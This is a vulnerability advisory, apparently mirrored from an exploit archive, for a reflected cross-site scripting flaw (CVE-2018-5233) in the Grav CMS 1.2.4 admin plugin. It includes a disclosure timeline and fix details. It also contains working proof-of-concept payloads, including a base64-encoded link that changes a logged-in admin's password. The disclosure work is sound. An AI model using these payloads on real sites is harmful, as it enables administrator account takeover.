@@ -1,0 +1,136 @@
+id: 30007
+date: 03/20/2018
+title: Grav CMS 1.2.4 Cross Site Scripting Vulnerability
+author: Kevin Locati
+cves: CVE-2018-5233
+
+# [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting
+(XSS) vulnerability
+
+## Description
+
+Grav CMS is a flat-file CMS using Markdown files for content management
+([Official Website](https://getgrav.org/)).
+
+It has been elected "Best Open Source CMS of 2016" by [CMS
+critic](https://www.cmscritic.com/the-winner-of-best-open-source-cms-for-2016-is-grav/).
+
+The application does not always filter user input correctly, thereby
+allowing an attacker to inject arbitrary Web content in the response of
+the server (reflected Cross Site Scripting).
+
+**CVE ID**: CVE-2018-5233
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 7.4
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
+
+
+## Details
+
+On lines 355 and 358 of `system/src/Grav/Common/Twig/Twig.php`,
+unfiltered user input is passed in the `$error_msg` variable.
+
+```
+$output = $this->twig->render($template, $twig_vars);
+} catch (\Twig_Error_Loader $e) {
+
+.. snip ..
+
+            throw new \RuntimeException($error_msg, 400, $e);
+        }
+    } else {
+        throw new \RuntimeException($error_msg, 400, $e);
+    }
+}
+```
+
+As a result, generating an exception by accessing
+`/admin/tools/someunexistingpage` and manipulating the
+`someunexistingpage` part of the URL allows to inject arbitrary Web
+content into the server's response.
+
+## Proof of Concept #1
+
+Visiting the following page:
+
+```
+/admin/tools/a--%3E%3Cimg%20src=x%20onerror=alert(1)%3E
+```
+
+will cause the execution of the `alert(1)` JavaScript code in the
+context of the visitor's browser.
+
+## Proof of Concept #2
+
+By tricking a logged-in admin into visiting a malicious link, any
+unauthenticated user can elevate its privileges to site administration.
+
+Here follows a Proof of Concept code which:
+
+1. Grabs the `admin-nonce` of the logged-in admin
+2. Prints that nonce
+3. Uses it to change the current admin's password to `Password7`
+
+```
+<script
+src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+adminNonce = "";
+$.get( "/admin/user/admin",
+function( data ) {adminNonce = $("input[name=admin-nonce]",
+data).val()}).done(
+function(){
+alert(window.adminNonce);
+$.post( "/admin/user/admin", {
+    "task": "save",
+        "admin-nonce": adminNonce,
+    "data[password]": "Password7"},
+    function(data){document.write(data)})}
+);
+</script>
+```
+
+Here is the base64 encoded version of the payload, injected in the
+malicious link:
+
+```
+http://example.site.com/admin/tools/a--%3E%3Cimg%20src=x%20onerror=document['write'](atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuMi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ+YWRtaW5Ob25jZSA9ICIiOyQuZ2V0KCAiL2FkbWluL3VzZXIvYWRtaW4iLCBmdW5jdGlvbiggZGF0YSApIHthZG1pbk5vbmNlID0gJCgiaW5wdXRbbmFtZT1hZG1pbi1ub25jZV0iLCBkYXRhKS52YWwoKX0pLmRvbmUoZnVuY3Rpb24oKXthbGVydCh3aW5kb3cuYWRtaW5Ob25jZSk7JC5wb3N0KCAiL2FkbWluL3VzZXIvYWRtaW4iLCB7ICJ0YXNrIjogInNhdmUiLCAiYWRtaW4tbm9uY2UiOiBhZG1pbk5vbmNlLCJkYXRhW3Bhc3N3b3JkXSI6ICJQYXNzd29yZDcifSwgZnVuY3Rpb24oZGF0YSl7ZG9jdW1lbnQud3JpdGUoZGF0YSl9KX0pOzwvc2NyaXB0Pgo='))%3E
+```
+
+Now, after the attacker tricks a logged-in admin into clicking on this
+link, the admin's password is changed to the attacker controlled value.
+Thus, the attacker can log in with `Password7` and navigate inside the
+administration interface.
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/07/2017 : Initial discovery
+* 01/07/2017 : Contact with the editor (email address)
+* 02/07/2017 : Editor acknowledges the report
+* 02/07/2017 : Sending further details and PoC code to the editor
+* 04/07/2017 : Editor fixes the vulnerability
+* 15/03/2018 : Advisory publication
+
+## Fixes
+
+Upgrade to version 1.3.0 and above (currently 1.3.10)
+
+## Affected versions
+
+* Version 1.2.4 (last stable version as of 02/07/2017 - previous
+versions are probably also vulnerable but not tested)
+
+## Credits
+
+* Kevin LOCATI <k.locati@sysdream.com>
+
+#  0day.today [2023-03-25]  #
